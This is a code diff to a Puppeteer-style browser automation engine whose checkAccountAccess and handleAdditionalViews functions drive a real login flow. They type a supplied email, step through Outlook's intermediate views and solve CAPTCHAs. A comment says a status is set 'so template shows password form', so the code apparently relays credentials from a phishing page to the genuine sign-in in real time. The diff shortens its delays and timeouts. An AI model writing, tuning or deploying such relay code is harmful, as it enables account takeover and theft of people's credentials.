@@ -167,7 +167,7 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
         iterationCount++;
 
         if (iterationCount > 1) {
-            await new Promise(r => setTimeout(r, 300));
+            await new Promise(r => setTimeout(r, 100));
         }
 
         const viewEvaluatePromise = page.evaluate((views, ctx, skipNames) => {
@@ -256,11 +256,11 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
             const keys = Array.isArray(view.action.keys) ? view.action.keys : [view.action.keys];
             for (const key of keys) {
                 await page.keyboard.press(key);
-                await new Promise(r => setTimeout(r, 300));
+                await new Promise(r => setTimeout(r, 100));
             }
             logger.info(`[handleAdditionalViews][${instanceId}] Pressed keyboard keys: ${keys.join(', ')} for view: ${view.name}`);
             viewHandledInThisIteration = true;
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 250));
             continue;
         }
         if (view.action.type !== 'click') {
@@ -290,9 +290,13 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
                 if (elementClicked) {
                     logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
                     clickedViewAction = true;
-                    const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                    await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
-                    await new Promise(r => setTimeout(r, 500));
+                    if (view.action.waitForSelector) {
+                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 5000 }).catch(() => null);
+                    } else {
+                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
+                        await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 5000 }).catch(() => null);
+                    }
+                    await new Promise(r => setTimeout(r, 250));
                 }
             } catch (textClickError) {
                 logger.warn(`[handleAdditionalViews][${instanceId}] Error clicking element by text for view ${view.name}: ${textClickError.message}`);
@@ -303,14 +307,19 @@ async function handleAdditionalViews(page, platformConfig, instanceId, context =
             for (const selector of actionSelectors) {
                 if (typeof selector !== 'string') continue;
                 try {
-                    await page.waitForSelector(selector, { visible: true, timeout: 5000 });
-                    const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                    const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
-                    await page.click(selector);
-                    await navigationPromise;
+                    await page.waitForSelector(selector, { visible: true, timeout: 2500 });
+                    if (view.action.waitForSelector) {
+                        await page.click(selector);
+                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 5000 }).catch(() => null);
+                    } else {
+                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
+                        const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 5000 }).catch(() => null);
+                        await page.click(selector);
+                        await navigationPromise;
+                    }
                     logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
                     clickedViewAction = true;
-                    await new Promise(r => setTimeout(r, 500));
+                    await new Promise(r => setTimeout(r, 250));
                     break;
                 } catch (modalClickError) {
                     logger.debug(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
@@ -793,7 +802,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                 }
                 if (inputFound) {
                     await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, platformConfig.selectors.input);
-                    await page.type(platformConfig.selectors.input, email, { delay: 50 });
+                    await page.type(platformConfig.selectors.input, email, { delay: 20 });
 
                     // Verify the typed value actually landed in the field (SPA re-renders can
                     // detach/clear the input mid-type). Re-type if it came back empty/mangled.
@@ -801,7 +810,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     if (!typedValue || !String(typedValue).includes('@')) {
                         logger.warn(`[checkAccountAccess][${instanceId}] Typed value missing after type() (got '${typedValue}'). Re-typing email.`);
                         await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, platformConfig.selectors.input);
-                        await page.type(platformConfig.selectors.input, email, { delay: 50 });
+                        await page.type(platformConfig.selectors.input, email, { delay: 20 });
                     }
 
                     let clicked = false;
@@ -823,7 +832,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     }
                     logger.info(`[checkAccountAccess][${instanceId}] Email submitted. URL: ${page.url()}`);
 
-                    await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
+                    await Promise.race([
+                        page.waitForFunction(() => document.readyState === 'complete').catch(() => null),
+                        new Promise(res => setTimeout(res, 3000))
+                    ]);
 
                     // Immediately set WAITINGPASSWORD so template shows password form
                     // while engine navigates intermediate views / solves CAPTCHAs.
@@ -842,14 +854,14 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     }
 
                     // Brief settle delay before checking page state
-                    await new Promise(res => setTimeout(res, 1000));
+                    await new Promise(res => setTimeout(res, 300));
 
                     // Wait for the page to actually transition (SPA) — look for either "Verify your email" or password input
                     const transitionSelectors = ["[data-testid='title']", "input[name='passwd']", "input[type='password']", "#proof-confirmation-email-input", "h1"];
-                    for (const sel of transitionSelectors) {
-                        try { await page.waitForSelector(sel, { visible: true, timeout: 5000 }); break; } catch(e) {}
-                    }
-                    await new Promise(res => setTimeout(res, 1000));
+                    try {
+                        await page.waitForSelector(transitionSelectors.join(', '), { visible: true, timeout: 5000 });
+                    } catch (e) { /* none visible — continue, additional views handler will detect */ }
+                    await new Promise(res => setTimeout(res, 300));
 
                     // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
                     await handleAdditionalViews(page, platformConfig, instanceId);
@@ -981,12 +993,12 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     // Wait for password input to become visible (handles Outlook "Use your password" transition delay)
                     const pwInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean);
                     if (pwInputSelectors.length > 0) {
-                        for (const sel of pwInputSelectors) {
+                        const pwCombinedSelector = pwInputSelectors.filter(s => typeof s === 'string').join(', ');
+                        if (pwCombinedSelector) {
                             try {
-                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
-                                break;
+                                await page.waitForSelector(pwCombinedSelector, { visible: true, timeout: 5000 });
                             } catch (e) {
-                                logger.debug(`[checkAccountAccess][${instanceId}] Password selector '${sel}' not visible after 5s wait.`);
+                                logger.debug(`[checkAccountAccess][${instanceId}] No password selector visible after 5s wait (combined).`);
                             }
                         }
                     }
